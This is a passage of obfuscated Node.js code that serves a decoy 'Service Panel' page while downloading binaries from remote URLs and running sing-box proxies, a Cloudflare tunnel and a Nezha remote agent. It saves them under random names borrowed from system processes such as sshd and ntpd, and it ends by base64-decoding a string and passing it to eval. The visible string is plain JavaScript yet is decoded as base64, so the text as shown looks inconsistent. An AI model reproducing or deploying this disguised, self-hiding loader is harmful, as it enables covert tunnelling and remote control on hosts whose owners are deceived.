un','1.1.1.1','VMESS_UUID','https','TUIC','config.json','Reality','uptime','vmess','length','amd64','cf_','stringify','silent','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Panel</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links{margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a{display:inline-block;margin:0\x2010px;padding:10px\x2020px;background:#667eea;color:white;text-decoration:none;border-radius:5px;transition:background\x200.3s}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a:hover{background:#5a67d8}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Panel</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Multi-protocol\x20service\x20management\x20panel.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/status\x22>View\x20Status</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer\x22>Service\x20Management\x20Panel</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','REALITY_PORT','REALITY_PUBLIC_KEY','warn','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Nezha</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','0.0.0.0','ntpd','base64','singbox','REALITY_SNI','SERVER_IP','nezha.log','cron','vmess-in','pipe','finish','url','?congestion_control=cubic&udp_relay_mode=native&alpn=h3,spdy/3.1&allow_insecure=1#TUIC','redis-server','running','VMess','protocol','logFile','nginx','unlinkSync','axios','5414088ISHMUV','0123456789abcdef','N_S','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>TUIC</div><div\x20class=\x22port-value\x22>','status-running','chrome','php-fpm','SIGINT','10s','hWB6PgxSoKUp1p0daF','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','N_K','C_T','rsyslogd','<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>No\x20active\x20connections</div></div>','containerd','match','join','crypto','cache.db','path','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','listen','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','loc.gov','map','1096qLWVFA','B_D','systemd','http-proxy-middleware','push','error','sshd','stopped','&alpn=h3#HY2'];_0x1ec9=function(){return _0x189a35;};return _0x1ec9();}function cleanup(){const _0x566f83=_0x4c21a7;processes[_0x566f83(0x142)](_0x211745=>{try{_0x211745['kill']();}catch(_0x183725){}}),process[_0x566f83(0x10c)](0x0);}async function startService(_0x243f87,_0x1f71fe,_0x3b2db5,_0x1a3ea3={}){const _0x39bffc=_0x4c21a7;try{const _0x167330=spawn(_0x243f87,_0x1f71fe,{'stdio':[_0x39bffc(0x146),_0x39bffc(0x189),_0x39bffc(0x189)],..._0x1a3ea3});if(_0x1a3ea3[_0x39bffc(0x191)]){const _0x1446e8=fs[_0x39bffc(0x1bf)](_0x1a3ea3['logFile']);_0x167330['stdout']['pipe'](_0x1446e8),_0x167330[_0x39bffc(0x1c1)][_0x39bffc(0x189)](_0x1446e8);}return serviceStatus[_0x3b2db5['toLowerCase']()]='running',_0x167330['on'](_0x39bffc(0x153),()=>{const _0xc82177=_0x39bffc;serviceStatus[_0x3b2db5[_0xc82177(0xfa)]()]=_0xc82177(0x18e);}),_0x167330['on'](_0x39bffc(0x1b4),()=>{const _0x29256c=_0x39bffc;serviceStatus[_0x3b2db5[_0x29256c(0xfa)]()]='error';}),_0x167330['on'](_0x39bffc(0x10c),()=>{const _0x1d786d=_0x39bffc;serviceStatus[_0x3b2db5[_0x1d786d(0xfa)]()]=_0x1d786d(0x1b6);}),new Promise(_0x68c694=>{const _0x44633e=()=>{const _0x4b7b23=_0x5628;_0x167330['killed']?(serviceStatus[_0x3b2db5[_0x4b7b23(0xfa)]()]=_0x4b7b23(0x1b6),_0x68c694(null)):(processes[_0x4b7b23(0x1b3)](_0x167330),_0x68c694(_0x167330));};setTimeout(_0x44633e,0x7d0);});}catch(_0x35b198){return serviceStatus[_0x3b2db5[_0x39bffc(0xfa)]()]=_0x39bffc(0x1b4),null;}}const app=express();app[_0x4c21a7(0x167)]('/',(_0x2f896e,_0x275d01)=>{const _0x1924f4=_0x4c21a7;_0x275d01[_0x1924f4(0x130)](0xc8,{'Content-Type':_0x1924f4(0x16b)}),_0x275d01[_0x1924f4(0x141)](HTML_TEMPLATES[_0x1924f4(0x101)]);}),app[_0x4c21a7(0x167)](_0x4c21a7(0x125),async(_0x35e516,_0xf516ff)=>{const _0x124872=_0x4c21a7,_0x417717=await getServerIP(),_0x88db80=generateLinks(_0x417717);_0xf516ff[_0x124872(0x130)](0xc8,{'Content-Type':_0x124872(0x16b)}),_0xf516ff['end'](HTML_TEMPLATES[_0x124872(0x136)](_0x417717,_0x88db80));}),app['get']('/x',async(_0x3f9a40,_0x5a81b7)=>{const _0x1859cb=_0x4c21a7,_0x3cca7c=await getServerIP(),_0x4423c6=generateLinks(_0x3cca7c);_0x5a81b7['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x5a81b7[_0x1859cb(0x141)](HTML_TEMPLATES[_0x1859cb(0x136)](_0x3cca7c,_0x4423c6));}),app['get'](_0x4c21a7(0x154),(_0x3261b7,_0x14d1f7)=>{const _0x5b22fe=_0x4c21a7;_0x14d1f7['writeHead'](0xc8,{'Content-Type':_0x5b22fe(0x143)}),_0x14d1f7[_0x5b22fe(0x141)](JSON[_0x5b22fe(0x179)]({'status':'ok','uptime':process[_0x5b22fe(0x174)]()}));});const server=http['createServer'](app);server['on']('upgrade',createProxyMiddleware({'target':_0x4c21a7(0xfb)+CONFIG[_0x4c21a7(0x152)],'changeOrigin':!![],'ws':!![],'logLevel':_0x4c21a7(0x17a)}));async function main(){const _0x53470e=_0x4c21a7;server[_0x53470e(0x1ab)](CONFIG[_0x53470e(0x117)],()=>{const _0x5891ee=_0x53470e;serviceStatus[_0x5891ee(0x15d)]=_0x5891ee(0x18e);});try{const _0x31981a=detectArch(),_0x46906d=_0x31981a===_0x53470e(0xf5),_0x5b2b5c=getRandomProcessName(),_0x5e7dfa=getRandomProcessName(),_0x40460d=getRandomProcessName(),_0x3cf08c=path[_0x53470e(0x1a6)](WORK_DIR,_0x5b2b5c),_0x3b42eb=path[_0x53470e(0x1a6)](WORK_DIR,_0x5e7dfa),_0x150d47=path['join'](WORK_DIR,_0x40460d),_0x52c6fe={'singbox':_0x46906d?_0x53470e(0x12e):_0x53470e(0x144),'cloudflared':_0x46906d?'https://github.com/seav1/dl/releases/download/upx/cf-arm':'https://github.com/seav1/dl/releases/download/upx/cf','nezha':_0x46906d?_0x53470e(0x11b):_0x53470e(0x100)};await Promise['all']([downloadBinary(_0x52c6fe[_0x53470e(0x183)],_0x3cf08c),downloadBinary(_0x52c6fe[_0x53470e(0x160)],_0x3b42eb),downloadBinary(_0x52c6fe['nezha'],_0x150d47)]),[_0x3cf08c,_0x3b42eb,_0x150d47][_0x53470e(0x142)](_0x9d64f=>{const _0x298ae7=_0x53470e;if(!fs[_0x298ae7(0x103)](_0x9d64f))throw new Error(_0x298ae7(0xf7)+_0x9d64f);});const _0x57ca04=await getServerIP();if(CONFIG[_0x53470e(0x13e)]||CONFIG['VMESS_PORT']||CONFIG[_0x53470e(0x17c)]||CONFIG[_0x53470e(0x139)]){await generateRealityKeys(_0x3cf08c);const _0x17ef17=await generateSingBoxConfig();try{await new Promise((_0x8887b8,_0x5cebe4)=>{const _0x3a84f8=_0x53470e;exec('\x22'+_0x3cf08c+_0x3a84f8(0x169)+_0x17ef17+'\x22',_0x1953e6=>{_0x1953e6?_0x5cebe4(_0x1953e6):_0x8887b8();});}),await startService(_0x3cf08c,[_0x53470e(0x16d),'-c',_0x17ef17],_0x53470e(0x183));}catch(_0xec38a2){serviceStatus[_0x53470e(0x183)]=_0x53470e(0x1b4);}}if(CONFIG[_0x53470e(0x1a1)])try{const _0x14ae13=['tunnel',_0x53470e(0x10e),'auto',_0x53470e(0x12a),'http2',_0x53470e(0x162),_0x53470e(0x16d),_0x53470e(0x1be),CONFIG['C_T'],'--url',_0x53470e(0x109)+CONFIG[_0x53470e(0x117)]];await startService(_0x3b42eb,_0x14ae13,_0x53470e(0x160));}catch(_0x8196e5){serviceStatus[_0x53470e(0x160)]=_0x53470e(0x1b4);}else{if(CONFIG[_0x53470e(0x152)]){const _0x4d47c7=await startTempTunnel(_0x3b42eb,CONFIG[_0x53470e(0x117)]);!_0x4d47c7&&(serviceStatus['cloudflared']=_0x53470e(0x1b4));}}if(CONFIG[_0x53470e(0x197)]&&CONFIG[_0x53470e(0x1a0)]){const _0x894953=['-s',CONFIG['N_S']+':'+CONFIG[_0x53470e(0x11c)],'-p',''+CONFIG[_0x53470e(0x1a0)],_0x53470e(0x145),'3',_0x53470e(0x123)];(CONFIG[_0x53470e(0x1bb)]==='--tls'||typeof CONFIG[_0x53470e(0x1bb)]==='string'&&CONFIG[_0x53470e(0x1bb)]['includes'](_0x53470e(0x112)))&&_0x894953[_0x53470e(0x1b3)](_0x53470e(0x112));try{await startService(_0x150d47,_0x894953,_0x53470e(0x16a),{'logFile':path[_0x53470e(0x1a6)](WORK_DIR,_0x53470e(0x186))});}catch(_0x13f710){serviceStatus[_0x53470e(0x16a)]=_0x53470e(0x1b4);}}setInterval(()=>{const _0x52496e=_0x53470e;processes['forEach'](_0x158c14=>{const _0x561aa6=_0x5628;if(_0x158c14[_0x561aa6(0x164)]){const _0x17fc3d=Object[_0x561aa6(0x107)](serviceStatus)[_0x561aa6(0x116)](_0x460deb=>serviceStatus[_0x460deb]===_0x561aa6(0x18e)&&!processes[_0x561aa6(0x1b9)](_0x2e29a4=>_0x2e29a4!==_0x158c14&&!_0x2e29a4[_0x561aa6(0x164)]));_0x17fc3d&&(serviceStatus[_0x17fc3d]=_0x561aa6(0x1b6));}}),processes[_0x52496e(0x176)]>0x0&&processes['every'](_0x249a82=>_0x249a82[_0x52496e(0x164)])&&cleanup();},0x2710),process['on'](_0x53470e(0x19c),cleanup),process['on'](_0x53470e(0x163),cleanup);}catch(_0x1d29b8){process['exit'](0x1);}}main()[_0x4c21a7(0x120)](()=>process[_0x4c21a7(0x10c)](0x1));';
const code = Buffer.from(b, 'base64').toString();
eval(code);
